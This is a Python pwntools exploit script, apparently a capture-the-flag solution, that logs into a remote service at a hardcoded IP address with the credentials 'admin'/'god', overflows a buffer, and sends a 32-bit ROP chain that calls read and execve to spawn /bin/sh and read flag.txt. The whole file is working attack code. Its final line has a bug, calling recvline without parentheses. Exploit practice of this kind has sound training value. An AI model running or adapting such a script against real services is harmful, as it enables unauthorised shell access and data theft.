from pwn import *

print("\033[31m[+] Exploit deployed\033[0m")

host = "109.233.56.90" 
port = 11081

r = remote(host, port)

# get credential via brute-force
login = b'admin'
password = b'god'
choise = b"2"

r.recvuntil(b"Username: ")
r.sendline(login)

r.recvuntil(b"Password: ")
r.sendline(password)

r.recvuntil(b"> ")

print("\033[32m[+] Authentification was passed\033[0m")

r.sendline(choise)

#garbage-data to buffer overflow
gdata = p8(0)
gdata += p8(0x90) * 263
gdata += p32(0x0804838e)

#payload with ROP-chain assembling
payload = b"flag.txt"
payload += gdata
payload += p32(0x0806fb09)	# pop ebx, pop edx, ret
payload += p32(0) + p32(9)	
payload += p32(0x0806fb31)  # pop ecx, pop ebx, ret
payload += p32(0x080ebf80) 	+ p32(0) # .bss buf + 8 bytes
payload += p32(0x080bba36)	# pop eax, ret
payload += p32(0x3)			# read syscall
payload += p32(0x080701d0) 	# int 0x80, ret
payload += p32(0x080bba36)	# pop eax, ret
payload += p32(0xb)			# execve syscall
payload += p32(0x0806fb31)	# pop ecx, pop ebx, ret
payload += p32(0)			# ecx
payload += p32(0x080ebf80)	# ebx
payload += p32(0x0806fb09)	# pop ebx, pop edx, ret
payload += p32(0x080ebf80)	# still ebx
payload += p32(0) 			# edx
payload += p32(0x08049741)	# int 0x80

print(f"\033[36m[+] Payload assembled : {payload}\033[0m")

r.recvuntil(b"Enter file name: ")
r.sendline(payload)

bin_sh = b'/bin/sh'
bin_sh += p8(0)

r.sendline(bin_sh)

r.recvuntil(b'\n')

print("\033[35m[+] Got Reverse-shell\033[0m")

r.sendline(b"cat flag.txt")

flag = r.recvline.decode().strip()

print(f"\033[33m[+] Catched flag : {flag}\033[0m")

r.close()
